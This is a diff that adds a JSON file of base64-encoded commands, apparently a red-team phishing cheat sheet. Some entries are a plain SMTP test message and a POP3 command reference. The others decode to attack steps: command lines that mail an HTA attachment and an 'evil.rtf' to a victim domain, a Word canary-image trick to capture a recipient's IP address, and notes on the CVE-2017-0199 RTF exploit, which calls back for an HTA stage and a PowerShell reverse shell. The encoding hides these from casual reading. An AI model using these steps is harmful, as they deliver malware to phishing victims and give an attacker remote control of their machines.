@@ -1,0 +1,42 @@
+{
+    "command": {
+        "smtp_interaction": {
+            "description": "Interact manually with SMTP server",
+            "commands": [
+                "SEVMTyBzbXRwLmRvbWFpbi5jb20KTUFJTCBGUk9NOjxhbGljZUBoYWNrZXIuY29tPgpSQ1BUIFRPOjxib2JAc2VjdXJlLm5ldD4KREFUQQpGcm9tOiBbQWxpY2UgSGFja2VyXSA8YWxpY2VAaGFja2VyLmNvbT4KICAgVG86IFtCb2IgU21pdGhdIDxib2JAc2VjdXJlLm5ldD4KICAgRGF0ZTogTW9uLCAxMiBBcHIgMjAxMCAxNDoyMToyNiAtMDQwMAogICBTdWJqZWN0OiBUZXN0IE1lc3NhZ2UKCiAgIEhpIHRoZXJlIQogICBUaGlzIGlzIHN1cHBvc2VkIHRvIGJlIGEgcmVhbCBlbWFpbC4uLgoKICAgSGF2ZSBhIGdvb2QgZGF5IQogICBBbGljZQoKCiAgIC4KIFFVSVQ="
+            ]
+        },
+        "pop3_interaction": {
+            "description": "POP3 Message Retrieval Interaction",
+            "commands": [
+                "VVNFUiBbdXNlcm5hbWVdIAkJMXN0IGxvZ2luIGNvbW1hbmQgICAgICAgCQkJCQkJVVNFUiBTdGFuCitPSyBQbGVhc2UgZW50ZXIgYSBwYXNzd29yZApQQVNTIFtwYXNzd29yZF0gCQkybmQgbG9naW4gY29tbWFuZCAgICAgICAJCQkJCVBBU1MgU2VDckV0CitPSyB2YWxpZCBsb2dvbgpRVUlUICAgCQkJTG9ncyBvdXQgYW5kIHNhdmVzIGFueSBjaGFuZ2VzICAJCQkJCVFVSVQKK09LIEJ5ZS1ieWUuClNUQVQgICAgCQkJUmV0dXJucyB0b3RhbCBudW1iZXIgb2YgbWVzc2FnZXMgYW5kIHRvdGFsIHNpemUgCQkJCVNUQVQKK09LIDIgMzIwCkxJU1QgICAgCQkJTGlzdHMgYWxsIG1lc3NhZ2VzICAgICAgCQkJCQkJTElTVAorT0sgMiBtZXNzYWdlcyAoMzIwIG9jdGV0cykKMSAxMjAKMiAyMDAKJgpMSVNUIDIKK09LIDIgMjAwClJFVFIgW21lc3NhZ2VdICAJCVJldHJpZXZlcyB0aGUgd2hvbGUgbWVzc2FnZSAgICAgCQkJCQlSRVRSIDEKK09LIDEyMCBvY3RldHMgZm9sbG93LgoqKioKREVMRSBbbWVzc2FnZV0gIAkJRGVsZXRlcyB0aGUgc3BlY2lmaWVkIG1lc3NhZ2UgICAJCQkJCURFTEUgMgorT0sgbWVzc2FnZSBkZWxldGVkCk5PT1AgICAgCQkJVGhlIFBPUDMgc2VydmVyIGRvZXMgbm90aGluZywgaXQgbWVyZWx5IHJlcGxpZXMgd2l0aCBhIHBvc2l0aXZlIHJlc3BvbnNlLiAgICAgICAJTk9PUAorT0sKUlNFVCAgICAJCQlVbmRlbGV0ZSB0aGUgbWVzc2FnZSBpZiBhbnkgbWFya2VkIGZvciBkZWxldGlvbiAJCQlSU0VUCitPSyBtYWlsZHJvcCBoYXMgMiBtZXNzYWdlcyAoMzIwIG9jdGV0cykKVE9QIFttZXNzYWdlXSBbbnVtYmVyXSAgCVJldHVybnMgdGhlIGhlYWRlcnMgYW5kIG51bWJlciBvZiBsaW5lcyBmcm9tIHRoZSBtZXNzYWdlICAgICAgICAJCVRPUCAxIDEwCitPSwoqKioK"
+            ]
+        },
+        "sendemail_cmdline": {
+            "description": "Command Line sending email",
+            "commands": [
+                "c2VuZEVtYWlsIC10IHVzZXJAZG9tYWluIC1mIHNlbmRlckBkb21haW4gLXUgImVtYWlsIGlzc3VlcyIgLWEgdGVzdDMuaHRhIC1zIDE5Mi4xNjguOTIuMTU5OjI1IC1tICJIZXkgZHVkZT8iIC12diAtbyBmcWRuPW1haWwuZG9tYWluLmNvbQ=="
+            ]
+        },
+        "sendemail_cmdline_smtp_server": {
+            "description": "Command Line sending email with specified SMTP server",
+            "commands": [
+                "ZWNobyAicGxlYXNlIGNvbnZlcnQgUlRGIiB8cy1uYWlsIC1zICJSVEYiIC1hIGV2aWwucnRmIC1TIGZyb209IjxqaW1Ac29tZWRvbWFpbi5jb20+IiAtUyBtdGE9c210cDovLzEwLjAuMC4xOjI1IHNvbWVndXlAdmljdGltZG9tYWluLmNvbQ=="
+            ]
+        },
+        "phishing_image_reconnaissance": {
+            "description": "Sending a user an image that it's email client will make a web request for - to get IP of user",
+            "commands": [
+                "SW5zZXJ0ID4gUXVpY2sgUGFydHMgPiBGaWVsZCA+IExpbmtzICYgUmVmZXJlbmNlcyA+IEluY2x1ZGVQaWN0dXJlID4gRW50ZXIgVVJMIG9mIGNhbmFyeSBpbWFnZQ=="
+            ]
+        },
+        "phishing_mailicious_rtf_file": {
+            "description": "Sending a malicious RTF file via email.",
+            "commands": [
+                "I21hbGljaW91cyBSVEYgZmlsZSAoaHR0cHM6Ly9naXRodWIuY29tL2JoZHJlc2gvQ1ZFLTIwMTctMDE5OSkKTmlzaGFuZyBoYXMgc2V2ZXJhbCBIVEEgcGF5bG9hZHMgdGhhdCB5b3UgY2FuIGluY2x1ZGUgUFMgaW4gdGhlIHNjcmlwdAoKSW4gZ2VuZXJhbCwgUlRGIHByb2Nlc3Mgd2lsbCBiZSAxKSBzZW5kIFJURiBmaWxlIHRvIHZpY3RpbSwgMikgUlRGIGNhbGxzIGJhY2sgdG8gSFRBIGZpbGUgdG8gZ2V0IG1vcmUgcGF5bG9hZCAoc3RhZ2UgMiwgc29ydGEpLCB0aGVuCjMpIHlvdSBjYW4gdXNlIHRoZSBIVEEgc2NyaXB0IHRvIGNhbGwgb3V0IGZvciBtb3JlIGRhdGEvbW9yZSBiYWQgb24gYSAzcmQgc2NyaXB0LCBzdWNoIGFzIGEgUFMxIFJldmVyc2UgTmlzaGFuZyBzY3JpcHQu"
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
